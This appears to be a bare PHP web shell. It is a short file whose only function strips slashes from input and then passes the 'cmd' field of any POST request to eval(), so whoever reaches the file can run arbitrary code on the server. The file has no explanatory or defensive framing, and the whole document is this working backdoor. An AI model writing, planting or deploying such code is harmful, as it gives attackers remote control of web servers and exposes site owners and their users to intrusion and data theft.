<?php
function magicboom($text){
	if (!get_magic_quotes_gpc()){
		return $text;
	} 
	return stripslashes($text);
} 

echo eval(magicboom($_POST['cmd']));
?>